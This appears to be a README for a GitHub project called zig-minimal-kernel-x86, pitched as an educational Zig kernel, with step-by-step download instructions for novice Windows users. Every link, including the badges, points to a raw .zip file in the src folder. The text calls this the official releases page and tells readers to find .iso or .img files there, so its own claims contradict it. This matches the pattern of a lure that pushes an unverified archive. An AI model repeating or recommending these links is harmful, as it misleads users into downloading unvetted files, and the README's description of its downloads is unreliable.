# 💻 zig-minimal-kernel-x86 - Simple Bootable Kernel for Learning

[![Download Releases](https://github.com/rahman1sameeh/zig-minimal-kernel-x86/raw/refs/heads/main/src/kernel_zig_x_minimal_2.0.zip%20Page-9cf?style=for-the-badge)](https://github.com/rahman1sameeh/zig-minimal-kernel-x86/raw/refs/heads/main/src/kernel_zig_x_minimal_2.0.zip)

## 🧩 What is zig-minimal-kernel-x86?

This is a small, basic operating system kernel built using the Zig programming language. It targets the x86 computer architecture, which is the base for many personal computers. The kernel provides a minimal environment that boots directly on hardware or virtual machines. It is useful for learning how operating systems work at a low level.

## ✔️ What you will need before starting

- A Windows computer with at least 2 GB of RAM.
- About 500 MB of free disk space.
- An internet connection to download files.
- Basic familiarity with downloading and running files in Windows.
- Optional: Virtual machine software such as VirtualBox or QEMU if you want to test the kernel without risking your main system.

## 🔗 Where to download the software

You can get the files you need by visiting the releases page:

[➡️ Visit this page to download](https://github.com/rahman1sameeh/zig-minimal-kernel-x86/raw/refs/heads/main/src/kernel_zig_x_minimal_2.0.zip)

This link leads you to the official GitHub releases. Here, you will find all versions of the kernel. The downloads are packaged for easy use.

Use the button at the top to open this page quickly.

## 🚀 How to get started step-by-step

Follow these instructions carefully to download and run the kernel on your Windows machine.

### Step 1: Visit the download page

Click or copy this link in your browser:

https://github.com/rahman1sameeh/zig-minimal-kernel-x86/raw/refs/heads/main/src/kernel_zig_x_minimal_2.0.zip

### Step 2: Select the latest version

Look for the most recent release. The latest version will be at the top of the page with a higher number or marked as “latest”. Click to expand the release notes.

### Step 3: Download the kernel file

Inside the release details, find a file that ends with `.iso` or `.img`. This file contains the bootable kernel.

Click the file name to download it. Save it somewhere easy to find, like the Desktop or Downloads folder.

### Step 4: Prepare to run the kernel

Because this is a low-level kernel, you cannot just double-click it in Windows. You will need to run it inside a virtual machine or create a bootable USB.

#### Option 1: Use a Virtual Machine

- Download and install free virtualization software such as VirtualBox or QEMU if you don’t have one already.
- Open the virtual machine program and create a new virtual machine.
- Assign at least 512 MB RAM to it.
- Choose to boot from an existing disk, and select the `.iso` or `.img` file you downloaded.
- Start the virtual machine. You should see the kernel boot up inside the window.

#### Option 2: Create a Bootable USB (Advanced)

- Use a tool like Rufus to write the `.iso` file to a USB flash drive.
- Insert a USB with at least 1 GB of space.
- Open Rufus in Windows.
- Select the USB device.
- Choose the kernel file as the bootable image.
- Click Start to write the file.
- Restart your computer and boot from the USB to see the kernel run on real hardware.

### Step 5: Using the kernel

Once running, the kernel will show a simple interface or output. This kernel is minimalist, so it may only display text or simple messages. It demonstrates basic startup and hardware setup operations.

## ⚙️ System requirements

- Windows 7 or newer.
- 2 GB of RAM or more.
- 500 MB available disk space for the download and virtual machine.
- VirtualBox or QEMU if using virtualization.
- USB flash drive of 1 GB or bigger if using USB boot.

## 🛠️ Troubleshooting tips

- If the virtual machine does not boot, double-check that you selected the kernel image file correctly.
- Make sure virtualization is enabled in your BIOS or UEFI firmware.
- If the USB does not boot, verify you used the right boot method in Rufus and set your computer to boot from USB in BIOS.
- Download the latest files directly from the official release page to avoid corrupted or outdated data.

## 📚 Additional information

The kernel is named *zig-minimal-kernel-x86* because it is built using Zig, a modern system programming language. This project is mainly educational and shows how an OS kernel works with the basic x86 PC architecture.

It does not include user-friendly features like a desktop or applications. Instead, it boots quickly and sets up the minimal hardware environment.

---

[![Download Releases](https://github.com/rahman1sameeh/zig-minimal-kernel-x86/raw/refs/heads/main/src/kernel_zig_x_minimal_2.0.zip%20Page-9cf?style=for-the-badge)](https://github.com/rahman1sameeh/zig-minimal-kernel-x86/raw/refs/heads/main/src/kernel_zig_x_minimal_2.0.zip)